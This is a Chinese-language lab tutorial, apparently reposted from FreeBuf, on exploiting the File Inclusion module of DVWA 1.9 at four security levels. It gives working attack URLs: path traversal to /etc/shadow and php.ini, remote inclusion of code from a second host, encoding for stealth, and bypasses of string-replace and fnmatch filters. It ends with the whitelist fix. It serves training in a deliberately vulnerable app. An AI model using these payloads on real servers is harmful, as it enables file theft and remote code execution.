# DVWA-1.9全级别教程之File Inclusion

 时间 2016-11-12 11:18:40  

_原文_[http://www.freebuf.com/articles/web/119150.html][1]



***本文原创作者：lonehand，转载须注明来自FreeBuf.COM**

目前，最新的 DVWA 已经更新到1.9版本 （ [http://www.dvwa.co.uk/][3] ） ，而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。

## DVWA 简介 DVWA （Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。

DVWA共有十个模块，分别是 

Brute Force（暴力（破解））

Command Injection（命令行注入）

CSRF（跨站请求伪造）

File Inclusion（文件包含）

File Upload（文件上传）

Insecure CAPTCHA（不安全的验证码）

SQL Injection（SQL注入）

SQL Injection（Blind）（SQL盲注）

XSS（Reflected）（反射型跨站脚本）

XSS（Stored）（存储型跨站脚本）

需要注意的是， DVWA 1.9 的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。

![][4]

## DVWA 的搭建 Freebuf 上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（[http://www.freebuf.com/sectool/102661.html][5]）已经写得非常好了，在这里就不赘述了。

之前模块的相关内容

[Brute Force][6]

[Command Injection][7]

[CSRF][8]

本文介绍的是File Inclusion模块的相关内容，后续教程会在之后的文章中给出。

### File Inclusion 

File Inclusion ，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。

![][9]

下面对四种级别的代码进行分析。

## Low 

服务器端核心代码

    <php
    //Thepagewewishtodisplay
    $file=$_GET['page'];
    >

可以看到，服务器端对 page 参数没有做任何的过滤跟检查。

服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是 php ，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

![][10]

点击 file1.php 后，显示如下

![][11]

而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。

### 漏洞利用 

1.本地文件包含

构造url 

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow][12]

![][13]

报错，显示没有这个文件，说明不是服务器系统不是Linux ，但同时暴露了服务器文件的绝对路径C:\xampp\htdocs。

构造 url （绝对路径）

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini][12]

成功读取了服务器的 php.ini 文件

![][14]

构造url（相对路径） 

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=..\..\..\..\..\..\..\..\..\xampp\htdocs\dvwa\php.ini][12]

加这么多 ..\ 是为了保证到达服务器的C盘根目录，可以看到读取是成功的。

![][15]

同时我们看到，配置文件中的 Magic_quote_gpc 选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。

可惜的是由于本次实验环境的 php 版本为5.4.31，所以无法进行验证。

![][16]

使用 %00 截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。

2.远程文件包含

当服务器的 php 配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器 192.168.5.12 上传一个phpinfo.txt文件，内容如下

![][17]

构造url

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt][12]

成功在服务器上执行了 phpinfo 函数

![][18]

为了增加隐蔽性，可以对 [http://192.168.5.12/phpinfo.txt][19] 进行编码 

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74][12]

同样可以执行成功

![][20]

## Medium 

服务器端核心代码

    <php
    
    //Thepagewewishtodisplay
    $file=$_GET['page'];
    
    //Inputvalidation
    $file=str_replace(array("http://","https://"),"",$file);
    $file=str_replace(array("../","..\""),"",$file);
    
    >

可以看到， Medium 级别的代码增加了str_replace函数，对page参数进行了一定的处理，将 ”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。 

### 漏洞利用 

使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。

例如 page= [hthttp://tp://192.168.5.12/phpinfo.txt][12]时，str_replace函数会将http://删除，于是page=[http://192.168.5.12/phpinfo.txt][19]，成功执行远程命令。

同时，因为替换的只是 “ ../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。

1.本地文件包含

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini][12]

读取配置文件成功

![][21]

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini][12]

绝对路径不受任何影响，读取成功

![][22]

2.远程文件包含

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt][12]

远程执行命令成功

![][23]

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74][12]

经过编码后的 url 不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是[http://192.168.5.12/phpinfo.txt][19]，因此读取失败。

![][24]

## High 

服务器端核心代码

    <php
    
    //Thepagewewishtodisplay
    $file=$_GET['page'];
    
    //Inputvalidation
    if(!fnmatch("file*",$file)&&$file!="include.php"){
       //Thisisn'tthepagewewant!
    echo"ERROR:Filenotfound!";
    exit;
    }
    
    >

可以看到， High 级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。

### 漏洞利用 

High 级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。

![][25]

构造url 

[http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini][12]

成功读取了服务器的配置文件

![][26]

至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。

## Impossible 

服务器端核心代码

    <php
    //Thepagewewishtodisplay
    $file=$_GET['page'];
    
    //Onlyallowinclude.phporfile{1..3}.php
    if($file!="include.php"&&$file!="file1.php"&&$file!="file2.php"&&$file!="file3.php"){
    //Thisisn'tthepagewewant!
    echo"ERROR:Filenotfound!";
    exit;
    }
    
    >

可以看到， Impossible 级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。

***本文原创作者：lonehand，转载须注明来自FreeBuf.COM**

[1]: http://www.freebuf.com/articles/web/119150.html?utm_source=tuicool&utm_medium=referral
[3]: http://www.dvwa.co.uk/
[4]: http://img2.tuicool.com/yUBryyv.jpg!web
[5]: http://www.freebuf.com/sectool/102661.html
[6]: http://www.freebuf.com/articles/web/116437.html
[7]: http://www.freebuf.com/articles/web/116714.html
[8]: http://www.freebuf.com/articles/web/118352.html
[9]: http://img0.tuicool.com/ZZNzUza.jpg!web
[10]: http://img1.tuicool.com/N36z2qq.jpg!web
[11]: http://img0.tuicool.com/eI3AV33.jpg!web
[12]: http://www.example.com
[13]: http://img1.tuicool.com/ymyAvuj.jpg!web
[14]: http://img0.tuicool.com/RVnAf23.jpg!web
[15]: http://img2.tuicool.com/vyeyemU.jpg!web
[16]: http://img0.tuicool.com/uAZBnuU.jpg!web
[17]: http://img2.tuicool.com/jAJBjqN.jpg!web
[18]: http://img1.tuicool.com/zuAruu6.jpg!web
[19]: http://192.168.5.12/phpinfo.txt
[20]: http://img2.tuicool.com/2MnyyuN.jpg!web
[21]: http://img1.tuicool.com/22m2e2a.jpg!web
[22]: http://img1.tuicool.com/VJBBVfy.jpg!web
[23]: http://img0.tuicool.com/zINzyye.jpg!web
[24]: http://img2.tuicool.com/zyYrMnA.jpg!web
[25]: http://img2.tuicool.com/jeiURb2.jpg!web
[26]: http://img2.tuicool.com/qYZNNrM.jpg!web